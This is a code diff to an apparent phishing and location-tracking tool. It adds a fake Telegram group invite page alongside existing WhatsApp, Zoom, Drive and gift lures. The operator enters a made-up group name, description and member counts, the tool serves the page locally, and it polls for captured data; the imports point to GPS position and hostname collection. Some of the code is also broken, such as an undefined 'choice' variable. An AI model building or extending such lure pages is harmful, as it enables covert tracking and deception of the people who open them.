@@ -9,8 +9,8 @@ from python.track import open_result_file, get_gps_position, get_hostname
 TEMPLATE    = "views"
 DRIVE       = f'{TEMPLATE}/'
 GIFT        = f'{TEMPLATE}/'
-TELEGRAM    = f'{TEMPLATE}/'
 TOMBOLA     = f'{TEMPLATE}/'
+TELEGRAM    = f'{TEMPLATE}/telegram'
 WHATSAPP    = f'{TEMPLATE}/whatsapp/'
 ZOOM        = f'{TEMPLATE}/zoom'
 PORT        = 8000
@@ -59,8 +59,11 @@ def set_config_file(params):
 def get_input(msg):
     while True:
         try:
-            response = str(input(f'{msg} => '))
+            response = format(input(f'{msg} => '))
             if len(response) != 0:
+                break
+            elif type(response) == int and response > 0:
+                print(response)
                 break
         except Exception as e:
             continue
@@ -86,6 +89,23 @@ def read_data():
                 time.sleep(5)
         else:
             time.sleep(5)
+
+def telegran(choice):
+    icon_file_name  = 'computer.jpg'
+    group_name      = get_input('Enter group name')
+    group_describe  = get_input('Group describe')
+    all_member      = get_input('Group members count')
+    online_member   = get_input('Online members count')
+    data            = {
+        "icon_file_name": icon_file_name,   "group_name"    : group_name,
+        "all_member"    : all_member,       "online_member" : online_member,
+        "group_describe": group_describe
+    }
+    params = json.dumps(data)
+    set_config_file(params)
+    start_local_server(TELEGRAM, choice)
+    time.sleep(2)
+    read_data()
 
 def whatsapp(choice):
     icon_file_name  = 'computer.jpg'
@@ -118,7 +138,7 @@ def choose_server(template):
     if template =='g':
         return 'g'
     if template =='t':
-        return 't'
+        telegran(choice)
     if template =='w':
         whatsapp(choice)
     if template =='z':
